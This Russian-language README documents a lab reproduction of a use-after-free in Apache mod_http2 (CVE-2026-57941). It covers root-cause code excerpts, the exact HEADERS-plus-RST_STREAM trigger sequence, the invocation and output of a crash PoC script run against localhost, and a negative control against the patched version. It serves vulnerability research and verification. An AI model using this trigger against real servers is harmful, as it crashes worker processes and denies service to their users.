# CVE-2026-57941: разбор и воспроизведение

## 1. Сводка

| Параметр | Значение |
|---|---|
| Идентификатор | CVE-2026-57941 |
| Компонент | Apache HTTP Server, mod_http2 |
| Класс | CWE-416, use after free |
| Затронуто | 2.4.0 по 2.4.68 |
| Исправлено | 2.4.69, ветка 2.4.x ревизия r1938665 |
| Оценка Apache | moderate |
| Оценка NVD | CVSS 3.1, 9.8 |
| Отчёт вендору | 2026-06-15 |
| Публикация | 2026-10-01 |
| Первооткрыватели | Lucian Nitescu, Simon Kappel, Gianluca Danesin (Altervista) |

Этот репозиторий содержит независимое воспроизведение краша, а не оригинальный отчёт. Логика триггера восстановлена по исходникам 2.4.68 и по описанию механизма в публичном advisory.

## 2. Причина

В mod_http2 есть одна общая временная бригада `session->bbtmp`. Она используется в двух местах, которые могут пересечься по времени.

Первое место, цикл чтения:

`modules/http2/h2_c1_io.c`, `read_and_feed()`:

```c
rv = ap_get_brigade(session->c1->input_filters,
                    session->bbtmp, AP_MODE_READBYTES,
                    APR_NONBLOCK_READ, bytes_requested);
if (APR_SUCCESS == rv) {
    if (!APR_BRIGADE_EMPTY(session->bbtmp)) {
        rv = c1_in_feed_brigade(session, session->bbtmp, &bytes_fed);
    }
}
```

`modules/http2/h2_c1_io.c`, `c1_in_feed_brigade()`:

```c
while (!APR_BRIGADE_EMPTY(bb)) {
    b = APR_BRIGADE_FIRST(bb);
    if (!APR_BUCKET_IS_METADATA(b)) {
        rv = c1_in_feed_bucket(session, b, inout_len);
        if (APR_SUCCESS != rv) goto cleanup;
    }
    apr_bucket_delete(b);
}
```

`c1_in_feed_bucket()` вызывает `apr_bucket_read()`, затем `nghttp2_session_mem_recv()`. Внутри nghttp2 работают колбэки.

Второе место, колбэк закрытия стрима:

`modules/http2/h2_session.c`, `ev_stream_closed()`:

```c
b = h2_bucket_eos_create(session->c1->bucket_alloc, stream);
APR_BRIGADE_INSERT_TAIL(session->bbtmp, b);
h2_c1_io_append(&session->io, session->bbtmp);
apr_brigade_cleanup(session->bbtmp);
```

Если клиент присылает HEADERS и RST_STREAM для одного стрима в одном TCP-сегменте, то RST обрабатывается прямо внутри `nghttp2_session_mem_recv()`, то есть внутри `c1_in_feed_bucket()`. Колбэк закрытия стрима вызывает `apr_brigade_cleanup(session->bbtmp)` и уничтожает тот самый bucket `b`, который внешний цикл держит в руках. После возврата внешний цикл делает `apr_bucket_delete(b)` и освобождает узел второй раз.

Дальше работает аллокатор bucket-ов. `apr_bucket_free()` повторно кладёт узел в свой freelist, список зацикливается, `apr_bucket_alloc()` выдаёт один и тот же узел двум владельцам. Поля `type` и `data` двух «разных» bucket-ов указывают на одну память, и очередной косвенный вызов идёт по мусору.

Точка падения в наших прогонах:

```
send_brigade_nonblocking()   server/core_filters.c:665
ap_core_output_filter()      server/core_filters.c:506
pass_output()                modules/http2/h2_c1_io.c:284
h2_c1_io_pass()
h2_session_send()
```

## 3. Триггер

Одно соединение:

1. `PRI * HTTP/2.0` и SETTINGS с `INITIAL_WINDOW_SIZE=100`.
2. Один TCP write: `HEADERS(stream 3, END_HEADERS, без END_STREAM)` и `RST_STREAM(3, CANCEL)`.
3. Отдельный TCP write: любой кадр, в PoC это PING.

Четыре таких соединения параллельно. Разделение на два write принципиально: RST должен попасть в тот же сегмент, что и HEADERS, а следующий кадр прийти в следующем цикле чтения.

## 4. Стенд

Сборка:

```bash
sh lab/build.sh
```

Скрипт скачивает официальный тарбол 2.4.68, подкладывает APR и APR-util, собирает и устанавливает в `lab/install`.

Конфиг: `lab/httpd.conf`. Отличия от обычного перечислены в самом файле, ключевые строки:

```
Protocols h2c http/1.1
ErrorLog "/tmp/h2_268/error.log"
LogLevel warn
```

`LogLevel warn` нужен, чтобы в лог попадали строки `AH00051` и `AH00052` уровня notice.

## 5. Воспроизведение

```bash
./h2crash.py -u http://127.0.0.1:8107 -d 20 -t 4 -l /tmp/h2_268/error.log
```

Ожидаемый вывод на уязвимой версии:

```
цель http://127.0.0.1:8107, потоков 4, длительность 20 с
соединений: 196, отказов: 0, падений воркера: 21
h2c после прогона: отвечает
итог: 21 падение воркера
```

Число падений зависит от планировщика. В серии прогонов по 20 секунд выходит от 7 до 21.

Строки в логе сервера:

```
[core:notice] AH00051: child pid 1940728 exit signal Segmentation fault (11)
[core:notice] AH00051: child pid 1942935 exit signal Segmentation fault (11)
```

## 6. Отрицательный контроль

Та же команда против 2.4.69:

```bash
./h2crash.py -u http://127.0.0.1:8106 -d 20 -t 4 -l /tmp/h2_269/error.log
```

Результат:

```
соединений: 384290, отказов: 0, падений воркера: 0
```

Обратите внимание на разницу в числе соединений. Уязвимый сервер успевает принять 200 соединений за 20 секунд, потому что постоянно перезапускает воркер. Исправленный принимает 384 тысячи.

## 7. Замечания по диагностике

- ASan этот класс не видит. Узлы bucket-ов живут в собственном freelist `apr_bucket_alloc`, а не в куче malloc, поэтому санитайзер кучи молчит. Единственный надёжный детектор, это строки `AH00051` и `AH00052` в логе MPM плюс смена pid воркера.
- Для отладки на своей сборке можно собрать APR с `-DAPR_BUCKET_DEBUG`. Тогда сработает `check_not_already_free` в `buckets/apr_buckets_alloc.c` и даст стек с двойным освобождением.
- gdb по падению показывает `si_signo=11`, `si_code=128`, `si_addr=0`, то есть обращение по нулевому указателю. Для падения в `send_brigade_nonblocking` это `mov (%r15),%rbx` при `r15=0`.

## 8. Ссылки

- Advisory Apache: https://httpd.apache.org/security/vulnerabilities_24.html
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2026-57941
- CVE Record: https://www.cve.org/CVERecord?id=CVE-2026-57941
- Письмо в oss-security: http://www.openwall.com/lists/oss-security/2026/10/01/19
- Исправление: r1938665 в ветке 2.4.x, исходный коммит trunk r1938664

## 9. Чего здесь нет

Здесь нет выполнения кода. Контроль над косвенным вызовом не продемонстрирован, NX и ASLR действуют, наблюдаемые значения это нули и указатели в кучу. Любое утверждение про RCE к этому репозиторию отношения не имеет.
